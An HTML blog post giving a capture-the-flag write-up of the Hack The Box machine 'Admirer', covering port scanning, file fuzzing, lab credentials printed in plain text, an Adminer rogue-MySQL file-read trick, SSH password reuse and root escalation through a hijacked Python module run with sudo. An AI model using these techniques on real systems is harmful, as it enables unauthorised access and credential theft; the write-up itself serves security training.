<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="icon" type="image/png" href="/favicon.png">
  <link rel="stylesheet" type="text/css" href="/css/style.css">
  <link
  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap"
  rel="stylesheet"> 
  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
  <script src="/dist/mark.min.js" charset="UTF-8"></script>
<title>Hackthebox - Admirer Writeup &mdash; fmash16's blog</title>
<meta property="og:title" content="Hackthebox - Admirer Writeup" />
      <meta property="og:description" content="" />
      <meta property="og:type" content="article" />
      <meta property="og:url" content="github" />
      <meta property="og:image" content="https://fmash16.github.io/img/htb_admirer/card.png" />

</head>

<body>
  <!-- Side navigation -->
	<div class="sidebar">
    <div class="vertical-center">
      <a href="/index.html" style="text-align:center"><img class="logo" src="/avatar.png" alt=""></a>
      <p style="text-align:center; color:#eee">
      <b style="font-family: 'Electrolize',sans-serif;font-size:1.7em;text-align:center; color:#eee">fmash16</b><br/>
      Student<br/>Infosec & Linux Enthusiast<br/><a href="/about.html" style="color:#0489B1">About me</a></p>
      <p style="text-align:center;font-size:20px">
        <a href="mailto:fmash16@gmail.com" style="display:inline"><i class="far fa-envelope"></i></a> 
        <a href="https://github.com/fmash16" style="display:inline"><i class="fab fa-github"></i></a> 
        <a href="https://twitter.com/fmash16" style="display:inline"><i class="fab fa-twitter"></i></a>
        <a href="https://reddit.com/user/fmash16" style="display:inline"><i class="fab fa-reddit-alien"></i></a>
      </p>
    </div>
	</div>

<article>
<h1 id="hackthebox---admirer-writeup">Hackthebox - Admirer Writeup</h1>
<div class="figure">
<img src="/img/htb_admirer/card.png" />

</div>
<h2 id="initial-foothold">## Initial Foothold</h2>
<h2 id="nmap">### Nmap</h2>
<p>Open ports: 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) 80/tcp open tcpwrapped</p>
<div class="figure">
<img src="/img/htb_admirer/1.png" />

</div>
<p>Found robots.txt that disallows /admin-dir</p>
<div class="figure">
<img src="/img/htb_admirer/3.png" />

</div>
<p>Found a possible user named <strong>waldo</strong></p>
<h2 id="directory-busting">### Directory Busting</h2>
<p>Fuzzing for .txt files in the /admin-dir, found 2 files: 1. <strong>contacts.txt</strong> 2. <strong>credentials.txt</strong></p>
<pre class="shell"><code>ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.187/admin-dir/FUZZ.txt</code></pre>
<div class="figure">
<img src="/img/htb_admirer/5.png" />

</div>
<div class="figure">
<img src="/img/htb_admirer/4.png" />

</div>
<p>We find the following in the credentials.txt file.</p>
<pre><code>[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!</code></pre>
<h2 id="ftp-login">### ftp login</h2>
<p>We login to the ftp server running on port 21 using the creds found</p>
<div class="figure">
<img src="/img/htb_admirer/6.png" />

</div>
<p>We download the 2 files found in the / directory to our local machine using the <code>get &lt;file&gt;</code> command.</p>
<h4 id="sql-dump-file">sql dump file</h4>
<ul>
<li>dumps images and related texts, nothing important</li>
<li>Running 10.1.41-MariaDB on debian9</li>
</ul>
<h4 id="html.tar.gz">html.tar.gz</h4>
<p>It seems to be a backup of the original site. We find a new directory /utility-scripts and find some interesting php pages there: * index.php * admin_tasks.php * db_admin.php</p>
<div class="figure">
<img src="/img/htb_admirer/7.png" />

</div>
<h4 id="admin_tasks.php">admin_tasks.php</h4>
<p>At the url (http://10.10.10.187/utility-scripts/admin_tasks.php), we find:</p>
<div class="figure">
<img src="/img/htb_admirer/7.png" />

</div>
<p>Here, we can run a some queries about uptime, logged in users, crontab view and some intersting backup files of passwd, shadow and so on which are &quot;not working&quot; as per the file found in the backup as they require root privileges. The php is as follows:</p>
<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php"><span class="kw">&lt;?php</span>
<span class="co">// Web Interface to the admin_tasks script</span>
<span class="co">//</span>
<span class="kw">if</span><span class="ot">(</span><span class="fu">isset</span><span class="ot">(</span><span class="kw">$_REQUEST</span><span class="ot">[</span><span class="st">&#39;task&#39;</span><span class="ot">]))</span>
{
  <span class="kw">$task</span> = <span class="kw">$_REQUEST</span><span class="ot">[</span><span class="st">&#39;task&#39;</span><span class="ot">];</span>
  <span class="kw">if</span><span class="ot">(</span><span class="kw">$task</span> == <span class="st">&#39;1&#39;</span> || <span class="kw">$task</span> == <span class="st">&#39;2&#39;</span> || <span class="kw">$task</span> == <span class="st">&#39;3&#39;</span> || <span class="kw">$task</span> == <span class="st">&#39;4&#39;</span> ||
     <span class="kw">$task</span> == <span class="st">&#39;5&#39;</span> || <span class="kw">$task</span> == <span class="st">&#39;6&#39;</span> || <span class="kw">$task</span> == <span class="st">&#39;7&#39;</span><span class="ot">)</span>
  {
    <span class="co">/************************************************************************ *********</span>
<span class="co">       Available options:</span>
<span class="co">         1) View system uptime</span>
<span class="co">         2) View logged in users</span>
<span class="co">         3) View crontab (current user only)</span>
<span class="co">         4) Backup passwd file (not working)</span>
<span class="co">         5) Backup shadow file (not working)</span>
<span class="co">         6) Backup web data (not working)</span>
<span class="co">         7) Backup database (not working)</span>

<span class="co">         </span><span class="al">NOTE</span><span class="co">: Options 4-7 are currently NOT working because they need root privileges.</span>
<span class="co">               I&#39;m leaving them in the valid tasks in case I figure out a way</span>
<span class="co">               to securely run code as root from a PHP page.</span>
<span class="co">    ************************************************************************* *********/</span>
    <span class="fu">echo</span> <span class="fu">str_replace</span><span class="ot">(</span><span class="st">&quot;</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">,</span> <span class="st">&quot;&lt;br /&gt;&quot;</span><span class="ot">,</span> <span class="fu">shell_exec</span><span class="ot">(</span><span class="st">&quot;/opt/scripts/admin_tasks.sh</span>
<span class="kw">$task</span><span class="st"> 2&gt;&amp;1&quot;</span><span class="ot">));</span>
  }
  <span class="kw">else</span>
  {
    <span class="fu">echo</span><span class="ot">(</span><span class="st">&quot;Invalid task.&quot;</span><span class="ot">);</span>
  }
}
<span class="kw">?&gt;</span></code></pre></div>
<p>We see that the code does not filter our input $task which we can tamper with using curl or burpsuite.</p>
<h4 id="db_admin.php">db_admin.php</h4>
<p>We find some credentials for the user <strong>waldo</strong> here. Looking at the code, we see that what this page does is log in as user waldo to the mysql server, which is accesible only from localhost.</p>
<p>db creds found: &gt; $username = &quot;waldo&quot;; &gt; $password = &quot;Wh3r3_1s_w4ld0?&quot;;</p>
<h4 id="index.php">index.php</h4>
<p>Having a look at the index.php from the ftp, we see that it differs from the one running on the site. The backed up one had a php code that tries to login to the sql server as the user waldo, but interestingly, with a password different from the one found in db_admin.php. Here, the password seems to have an error(?), with the mismatched &quot;.</p>
<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php"><span class="kw">&lt;?php</span>
   <span class="kw">$servername</span> = <span class="st">&quot;localhost&quot;</span><span class="ot">;</span>
   <span class="kw">$username</span> = <span class="st">&quot;waldo&quot;</span><span class="ot">;</span>
   <span class="kw">$password</span> = <span class="st">&quot;]F7jLHw:*G&gt;UPrTo}~A&quot;</span>d6b<span class="st">&quot;;</span>
<span class="st">   </span><span class="kw">$dbname</span><span class="st"> = &quot;</span>admirerdb<span class="st">&quot;;</span>

<span class="st">   // Create connection</span>
<span class="st">   </span><span class="kw">$conn</span><span class="st"> = new mysqli(</span><span class="kw">$servername</span><span class="st">, </span><span class="kw">$username</span><span class="st">, </span><span class="kw">$password</span><span class="st">, </span><span class="kw">$dbname</span><span class="st">);</span>
<span class="st">   // Check connection</span>
<span class="st">   if (</span><span class="kw">$conn</span><span class="st">-&gt;connect_error) {</span>
<span class="st">       die(&quot;</span>Connection failed: <span class="st">&quot; . </span><span class="kw">$conn</span><span class="st">-&gt;connect_error);</span>
<span class="st">   }</span>

<span class="st">   </span><span class="kw">$sql</span><span class="st"> = &quot;</span><span class="kw">SELECT</span> * <span class="kw">FROM</span> items<span class="st">&quot;;</span>
<span class="st">   </span><span class="kw">$result</span><span class="st"> = </span><span class="kw">$conn</span><span class="st">-&gt;query(</span><span class="kw">$sql</span><span class="st">);</span>

<span class="st">   if (</span><span class="kw">$result</span><span class="st">-&gt;num_rows &gt; 0) {</span>
<span class="st">       // output data of each row</span>
<span class="st">       while(</span><span class="kw">$row</span><span class="st"> = </span><span class="kw">$result</span><span class="st">-&gt;fetch_assoc()) {</span>
<span class="st">           echo &quot;</span>&lt;article <span class="kw">class</span>=<span class="st">&#39;thumb&#39;</span>&gt;<span class="st">&quot;;</span>
<span class="st">           echo &quot;</span>&lt;a href=<span class="st">&#39;&quot;.$row[&quot;image_path&quot;].&quot;&#39;</span> <span class="kw">class</span>=<span class="st">&#39;image&#39;</span>&gt;&lt;/img src=<span class="st">&#39;&quot;.$row[&quot;thumb_path&quot;].&quot;&#39;</span> alt=<span class="st">&#39;&#39;</span> /&gt;&lt;/a&gt;<span class="st">&quot;;</span>
<span class="st">           echo &quot;</span>&lt;h2&gt;<span class="st">&quot;.</span><span class="kw">$row</span><span class="st">[&quot;</span>title<span class="st">&quot;].&quot;</span>&lt;/h2&gt;<span class="st">&quot;;</span>
<span class="st">           echo &quot;</span>&lt;p&gt;<span class="st">&quot;.</span><span class="kw">$row</span><span class="st">[&quot;</span>text<span class="st">&quot;].&quot;</span>&lt;/p&gt;<span class="st">&quot;;</span>
<span class="st">           echo &quot;</span>&lt;/article&gt;<span class="st">&quot;;</span>
<span class="st">       }</span>
<span class="st">    } </span>
<span class="st">    else {</span>
<span class="st">             echo &quot;</span><span class="dv">0</span> results<span class="st">&quot;;</span>
<span class="st">         }</span>
<span class="st">    </span><span class="kw">$conn</span><span class="st">-&gt;close();</span>
<span class="st">?&gt;</span></code></pre></div>
<h2 id="privilege-escalation-user">## Privilege escalation : User</h2>
<h2 id="database-management-tool-adminer">### Database management tool: Adminer</h2>
<p>Resembling the box name, adminer is a database management tool like phpmyadmin that lets manage the database through a browser. The default login page URI of adminer is adminer.php. We find login page in the /utility-scripts directory. The name of the database id <strong>admirerdb</strong> found from the file dump.sql</p>
<div class="figure">
<img src="/img/htb_admirer/9.png" />

</div>
<p>We try logging in with the different creds we found previously but none works.</p>
<p>We search for adminer vulnerabilities and find one at (https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)</p>
<h2 id="adminer-exploit">### Adminer Exploit</h2>
<p>We follow the instructions:</p>
<ol style="list-style-type: decimal">
<li>We connect to mysql server running on our local machine from the adminer page. For this, we set up a user and a database for connection from remote sources. We follow the steps as follows:</li>
</ol>
<ul>
<li>Create a new database and add a new user with password and grant privileges to the created database. NExt we add a new table 'test' to the database</li>
</ul>
<pre class="mysql"><code>CREATE DATABASE &#39;htb_admirer&#39;;
CREATE USER admirer@10.10.14.2 IDENTIFIED BY &#39;admirer&#39;;   
GRANT ALL PRIVILEGES ON htb_admirer.* TO admirer@10.10.14.2 WITH GRANT OPTION;
CREATE USER admirer@&#39;%&#39; IDENTIFIED BY &#39;admirer&#39;;   
GRANT ALL PRIVILEGES ON htb_admirer.* TO admirer@&#39;%&#39; WITH GRANT OPTION;
FLUSH PRIVILEGES;
use htb_admirer;
CREATE TABLE test( 
  &gt; name  VARCHAR(255),
  &gt; color CHAR(7),
  &gt; PRIMARY KEY (name) 
);</code></pre>
<ul>
<li>Change the bind address in your file /etc/mysql/mariadb.conf.d/50-server.cnf from default 127.0.0.1 to 0.0.0.0 for allowing remote connections to mysql server. Note that this is not secure and should be changed after the work is done.</li>
</ul>
<ol start="2" style="list-style-type: decimal">
<li><p>We connect to our mysql server with the necessary creds from adminer:</p>
<div class="figure">
<img src="/img/htb_admirer/11.png" />

</div></li>
<li><p>Going into the sql command, we put in our required command and execute. Since the adminer.php file in in the utility-scripts directory, we can use ../index.php to read the local index.php file which should contain the db creds for user waldo, which we ound in the backup but with a typo:</p></li>
</ol>
<pre class="mysql"><code>LOAD DATA LOCAL INFILE &#39;var/lib/mysql/mysql/local.xml&#39; 
INTO TABLE htb_admirer.test
FIELDS TERMINATED BY &quot;\n&quot;</code></pre>
<div class="figure">
<img src="/img/htb_admirer/12.png" />

</div>
<ol start="4" style="list-style-type: decimal">
<li>We read the data inserted to our table from the local file index.php.</li>
</ol>
<div class="figure">
<img src="/img/htb_admirer/13.png" />

</div>
<p>We get the correct creds for user waldo now. $password = &quot;&amp;<h5b~yK3F#{PaPB&dA}{H>&quot;;</p>
<p>Now, we use the found creds to login into adminer as waldo</p>
<div class="figure">
<img src="/img/htb_admirer/14.png" />

</div>
<div class="figure">
<img src="/img/htb_admirer/15.png" />

</div>
<div class="figure">
<img src="/img/htb_admirer/16.png" />

</div>
<p>We see that we can see the images.</p>
<p>Since many users use the same password in many places, we try the password for waldo to get ssh access and we succeed</p>
<div class="figure">
<img src="/img/htb_admirer/17.png" />

</div>
<h2 id="privilege-escalation-root">## Privilege escalation : root</h2>
<h2 id="enumeration">### Enumeration</h2>
<p>Running sudo -l with waldo's password shows that we can run /opt/scripts/admin_scripts.sh as root.</p>
<div class="figure">
<img src="/img/htb_admirer/18.png" />

</div>
<p>Running the script, we can backup the /etc/shadow file but it is only readable by root. We try to hijack the path &quot;echo&quot; is called from in the script by changing the path to our directory /tmp/fm and creating a py file named &quot;echo&quot; there. But it fails since we see that in sudo -l command output, there is a secure path, which sets the path for sudo commands. So, path hijacking will not work.</p>
<p>After lookin around for a while, we find that we can hijack the python path for the module shutil which is imported in the file backup.py, which is run in the script admin_tasks.sh in the task 6-backup web. This looks like a promising attack vector.</p>
<div class="figure">
<img src="/img/htb_admirer/20.png" />

</div>
<div class="figure">
<img src="/img/htb_admirer/21.png" />

</div>
<h2 id="python-path-hijack">### Python path hijack</h2>
<p>You can read up on this <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=3&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiuwdyNgJ_pAhX9xjgGHd_2A0kQFjACegQIBBAB&amp;url=https%3A%2F%2Fmedium.com%2F%40klockw3rk%2Fprivilege-escalation-hijacking-python-library-2a0e92a45ca7&amp;usg=AOvVaw3-QulW0rZZnpDyQbOp2xNV">here</a></p>
<p>We create a directory <code>/tmp/fm</code> and write a python script in the name of the module <code>shutil.py</code> containing the function <code>make_archive(a,b,c)</code> which will run out desired code, in this case cat ing out the root.txt to a file named hello in the directory /tmp/fm:</p>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="im">import</span> os

<span class="kw">def</span> make_archive(a,b,c):
        os.system(<span class="st">&quot;cat /root/root.txt &gt; /tmp/fm/hello&quot;</span>)</code></pre></div>
<p>Now we have to make python look for the module in our directory first instead of <code>/usr/lib/python3.5</code>.</p>
<p>We trying exporting the path using <code>export PYTHONPATH=/tmp/fm</code>. But this path is not read while running sudo. You can read up on PYTHONPATH <a href="https://www.tutorialspoint.com/What-is-PYTHONPATH-environment-variable-in-Python">here</a></p>
<p>After looking for a bit, we find that we can pass environment variables directly in the sudo command like <code>sudo VARIABLE=VALUE COMMAND</code>.</p>
<p>This was completely new to me. I found this <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwjV-fSV_p7pAhXRyzgGHRQTBqIQFjAAegQIAhAB&amp;url=https%3A%2F%2Faskubuntu.com%2Fquestions%2F57915%2Fenvironment-variables-when-run-with-sudo&amp;usg=AOvVaw19NVFoRV8gSxsfZPFAjdyB">here</a>.</p>
<p>So, we run the following commands to get our root.txt</p>
<div class="figure">
<img src="/img/htb_admirer/19.png" />

</div>
</article>

<footer>
  <p> Generated with a modified version of <a href="https://github.com/fmash16/ssg5">ssg5</a> By fmash16 <br /> 
  <i class="far fa-copyright"></i> 2020-2020 </p>
</footer>
</body>
